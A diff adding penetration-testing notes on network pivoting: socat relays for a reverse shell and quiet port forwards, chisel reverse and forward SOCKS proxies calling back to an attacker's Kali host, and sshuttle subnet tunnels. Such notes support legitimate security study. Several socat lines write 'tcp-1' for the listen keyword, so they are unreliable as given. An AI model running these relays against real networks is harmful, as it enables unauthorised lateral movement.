@@ -224,3 +224,118 @@ ssh-keygen
 sudo apt install putty-tools
 puttygen id_rsa -o windowskey.ppk
 ```
+
+## Other tools on linux
+
+### socat
+> Compiled binary probably has to be pushed onto the target system
+
+1. Reverse shell relay
+
+This creates a listening port on the intermediate host that forwards all traffic to our machine (at least with the command that follows)
+
+```bash
+# 1. open listening port on kali
+kali> nc -nlvp 443
+
+# 2. start socat on intermediate host and forward incoming traffic on port 8000 to the listening port on the kali machine
+./socat tcp-1:8000 tcp:<kaliIP>:443 &
+```
+
+2. Port Forwarding
+
+Forward the traffic to a target machine over an intermediate host
+
+```bash
+# fork reuseaddr allow for multiple constant connections
+intermediate> socat tcp-1:4430,fork,reuseaddr tcp:<targetIP>:443 &
+```
+
+Pipes all incoming traffic to the target deep in the network.
+
+3. Port Forwarding (quiet)
+
+```bash
+# 1. on kali
+kali> socat tcp-1:8001 tcp-1:8000,fork,reuseaddr &
+
+# 2. intermediate / relays
+socat tcp:<kaliIP>:8001 tcp:<deepHostIP>:<port>,fork &
+```
+
+-> This is silent as on the relay no ports are opened, but `socat` handles incoming traffic directly (session is already open). We can access the local port 8000 which will be forwarded over the relay to the actual destination and vice versa.
+
+### chisel
+> You definetly need chisel on both the attacker and the relay!
+
+Good [SOURCE](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
+
+Modes
+- client
+- server
+
+1. Reverse Socks Proxy (usually what we want - from our machine into the network)
+
+```bash
+# 1. kali start listener
+kali> chisel server -p 4444 --reverse &
+
+# 2. on the relay
+relay> chisel client <kaliIP>:4444 R:socks &
+```
+
+**IMPORTANT**: Check on which port chisels socks-proxy is listening (console output, default 1080)
+
+2. Forward Socks Proxy
+
+```bash
+# 1. run on relay
+relay> chisel server -p 4321 --socks5
+
+# 2. run on kali - socks proxy port would be opened on 1080 on kali
+kali> chisel client <relayIP>:4321 <localSocksPort>:socks
+kali> chisel client 10.10.10.15:4321 1080:socks
+```
+
+3. Remote Port Forward (kind of vice versa as in ssh -> we forward local traffic to remote)
+
+```bash
+kali> chisel server -p 4444 --reverse &
+relay> chisel client <kaliIP>:4444 R:<portOnKali>:<relayIP>:<targetPort> &
+
+# with data from above image go on kali 3333 to get rdp to .5
+relay> chisel client <kaliIP>:4444 R:3333:10.10.10.15:3389 &
+```
+
+4. Local Port Forward
+
+```bash
+relay> chisel server -p 1234
+kali> chisel client <relayIP>:1234 <kaliPort>:<victimIP>:<victimPort>
+```
+
+Both 3 and 4 forward traffic into the network (? In my understanding - also see source of this block)
+
+### sshuttle
+
+> Creates an ssh tunnel but provides an actual interface on your machine -> it behaves similar to a VPN
+
+- requires ssh username/password for the relay!
+
+```bash
+# kali connect to relay via sshuttle
+sshuttle -r user@10.10.10.15 10.10.10.0/24 &
+sshuttle -r user@relayIP -N & # detect network
+```
+
+Access via identity-File
+
+```bash
+sshuttle -r user@relayIP --ssh-cmd "ssh -i id_rsa" 10.10.10.0/24 # passing a keyfile
+```
+
+-> Above would result in looping the relay also into this tunnel, therefore an exclusion must be made
+
+```bash
+sshuttle -r user@address -N -x 10.10.10.15
+```
